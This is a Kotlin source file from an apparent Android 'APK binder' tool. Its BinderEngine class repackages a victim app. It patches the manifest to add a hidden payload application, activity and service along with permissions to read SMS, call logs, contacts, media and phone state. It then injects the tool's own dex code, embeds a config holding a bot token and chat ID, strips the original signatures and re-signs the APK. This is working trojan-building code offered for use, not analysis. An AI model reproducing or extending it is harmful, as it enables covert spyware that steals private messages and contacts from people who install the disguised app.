package Com.devhs.apkbinder.binder

import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import androidx.documentfile.provider.DocumentFile
import com.android.apksig.ApkSigner
import Com.devhs.apkbinder.core.Const
import Com.devhs.apkbinder.data.Feature
import Com.devhs.apkbinder.data.LogLevel
import Com.devhs.apkbinder.data.PayloadConfig
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.security.KeyStore
import java.security.PrivateKey
import java.security.cert.X509Certificate
import java.util.zip.ZipEntry
import java.util.zip.ZipFile
import java.util.zip.ZipOutputStream

class BinderEngine(private val ctx: Context) {
    private val permissions = listOf(
        "android.permission.INTERNET",
        "android.permission.READ_SMS",
        "android.permission.READ_CALL_LOG",
        "android.permission.READ_CONTACTS",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.READ_PHONE_STATE",
        "android.permission.POST_NOTIFICATIONS",
        "android.permission.FOREGROUND_SERVICE",
        "android.permission.FOREGROUND_SERVICE_DATA_SYNC"
    )

    suspend fun bind(
        source: Uri,
        activity: String,
        features: Set<Feature>,
        config: PayloadConfig,
        outDir: DocumentFile,
        onLog: (LogLevel, String) -> Unit
    ) = withContext(Dispatchers.IO) {

        onLog(LogLevel.INFO, "Preparing workspace...")
        val work = File(ctx.cacheDir, "bind_" + System.currentTimeMillis())
        work.mkdirs()

        val base = File(work, "base.apk")
        copyUri(source, base)
        if (base.length() < 1024) throw IllegalStateException("Invalid APK file")
        onLog(LogLevel.INFO, "Source APK: " + base.length() / 1024 + " KB")

        val srcZip = ZipFile(base)
        val manifestEntry = srcZip.getEntry("AndroidManifest.xml")
            ?: throw IllegalStateException("No AndroidManifest.xml in APK")
        val manifest = srcZip.getInputStream(manifestEntry).use { it.readBytes() }

        val originalApp = AxmlPatcher.readApplicationName(manifest)
        onLog(LogLevel.INFO, "Original application: " + (originalApp ?: "(none)"))
        onLog(LogLevel.INFO, "Manifest size: " + manifest.size + " bytes")

        onLog(LogLevel.INFO, "Patching AndroidManifest.xml...")
        val patched = try {
            AxmlPatcher.patch(
                manifest,
                Const.PAYLOAD_APP,
                Const.PAYLOAD_ACTIVITY,
                Const.PAYLOAD_SERVICE,
                permissions
            )
        } catch (t: Throwable) {
            srcZip.close()
            throw IllegalStateException(
                "Manifest patch failed: " + (t.message ?: "unknown") +
                    " (manifest=" + manifest.size + " bytes). " +
                    "If this is a split APK, use a single-APK build instead."
            )
        }
        onLog(LogLevel.SUCCESS, "Manifest patched")

        onLog(LogLevel.INFO, "Collecting all payload dex files...")
        // এখানে আপনার অ্যাপের সমস্ত ডেক্স ফাইল (Classes.dex থেকে শুরু করে মাল্টি-ডেক্স সব কয়টি) সম্পূর্ণ সংগ্রহ করা হচ্ছে
        val dexes = collectAllOwnDex()
        if (dexes.isEmpty()) {
            srcZip.close()
            throw IllegalStateException("Payload dex files not found")
        }
        onLog(LogLevel.INFO, "Total Injected Dex files: " + dexes.size)

        val maxDex = srcZip.entries().toList()
            .mapNotNull { Regex("^classes(\\d*)\\.dex$").find(it.name) }
            .map { it.groupValues[1].ifEmpty { "1" }.toInt() }
            .maxOrNull() ?: 0

        val cfgBytes = JSONObject().apply {
            put("token", config.token)
            put("chatId", config.chatId)
            put("origApp", originalApp ?: "")
            put("features", JSONArray(config.features))
            put("activity", activity)
        }.toString().toByteArray()

        val unsigned = File(work, "unsigned.apk")
        ZipOutputStream(FileOutputStream(unsigned).buffered()).use { zos ->
            for (e in srcZip.entries().toList()) {
                if (e.isDirectory) continue
                if (e.name == "AndroidManifest.xml") continue
                if (e.name == "assets/" + Const.CONFIG_ASSET) continue
                if (e.name.startsWith("META-INF/") &&
                    (e.name.endsWith(".SF") || e.name.endsWith(".RSA") ||
                        e.name.endsWith(".DSA") || e.name.endsWith(".MF"))
                ) continue

                val data = srcZip.getInputStream(e).use { it.readBytes() }
                val entry = ZipEntry(e.name)
                entry.method = ZipEntry.DEFLATED
                
                zos.putNextEntry(entry)
                zos.write(data)
                zos.closeEntry()
            }
            srcZip.close()

            zos.putNextEntry(ZipEntry("AndroidManifest.xml"))
            zos.write(patched)
            zos.closeEntry()

            zos.putNextEntry(ZipEntry("assets/" + Const.CONFIG_ASSET))
            zos.write(cfgBytes)
            zos.closeEntry()

            // টার্গেট এপিকে-র নিজস্ব ডেক্স নামগুলোর সাথে সিরিয়াল মেইনটেইন করে আপনার অ্যাপের সবকটি ডেক্স ফাইল ইনজেক্ট করা হচ্ছে
            dexes.forEachIndexed { i, bytes ->
                val dexName = if (i == 0) "classes" + (maxDex + 1) + ".dex" else "classes" + (maxDex + i + 1) + ".dex"
                zos.putNextEntry(ZipEntry(dexName))
                zos.write(bytes)
                zos.closeEntry()
            }
        }
        onLog(LogLevel.SUCCESS, "Archive built: " + unsigned.length() / 1024 + " KB")

        val finalApk = File(work, "final.apk")
        try {
            onLog(LogLevel.INFO, "Signing APK...")
            sign(unsigned, finalApk)
            onLog(LogLevel.SUCCESS, "Signed OK")
        } catch (t: Throwable) {
            onLog(LogLevel.WARN, "Signing failed: " + (t.message ?: "unknown"))
            unsigned.copyTo(finalApk, overwrite = true)
        }

        val name = "HsBinder_" + System.currentTimeMillis() + ".apk"
        val doc = outDir.createFile("application/vnd.android.package-archive", name)
            ?: throw IllegalStateException("Cannot create output file")
        ctx.contentResolver.openOutputStream(doc.uri)!!.use { os ->
            finalApk.inputStream().use { it.copyTo(os) }
        }
        onLog(LogLevel.SUCCESS, "Saved: " + doc.name)
        onLog(LogLevel.SUCCESS, "APK Binding Completed!")

        work.deleteRecursively()
    }

    private fun copyUri(uri: Uri, target: File) {
        val stream = if (uri.scheme == "file") {
            File(uri.path!!).inputStream()
        } else {
            ctx.contentResolver.openInputStream(uri) ?: throw IllegalStateException("Cannot open APK")
        }
        stream.use { input -> target.outputStream().use { input.copyTo(it) } }
    }

    private fun collectAllOwnDex(): List<ByteArray> {
        val info = ctx.packageManager.getApplicationInfo(ctx.packageName, PackageManager.GET_META_DATA)
        val paths = ArrayList<String>()
        info.sourceDir?.let { paths.add(it) }
        info.splitSourceDirs?.let { paths.addAll(it) }

        val out = ArrayList<ByteArray>()
        for (path in paths) {
            try {
                ZipFile(path).use { z ->
                    // এখানে আপনার অ্যাপে থাকা সমস্ত ডেক্স ফাইল (classes.dex, classes2.dex থেকে শুরু করে সব) নিখুঁতভাবে ফিল্টার করে নেওয়া হচ্ছে
                    z.entries().toList()
                        .filter { Regex("^classes\\d*\\.dex$").matches(it.name) }
                        .sortedBy { it.name }
                        .forEach { e -> 
                            out.add(z.getInputStream(e).use { it.readBytes() }) 
                        }
                }
            } catch (_: Throwable) {
            }
        }
        return out
    }

    private fun sign(input: File, output: File) {
        val ks = KeyStore.getInstance("PKCS12")
        ctx.assets.open(Const.KEYSTORE_ASSET).use { ks.load(it, Const.KS_PASS.toCharArray()) }
        val key = ks.getKey(Const.KS_ALIAS, Const.KS_PASS.toCharArray()) as PrivateKey
        val cert = ks.getCertificate(Const.KS_ALIAS) as X509Certificate

        val signerConfig = ApkSigner.SignerConfig.Builder(Const.KS_ALIAS, key, listOf(cert)).build()
        ApkSigner.Builder(listOf(signerConfig))
            .setInputApk(input)
            .setOutputApk(output)
            .setV1SigningEnabled(true)
            .setV2SigningEnabled(true)
            .setV3SigningEnabled(true)
            .setMinSdkVersion(26)
            .build()
            .sign()
    }
}
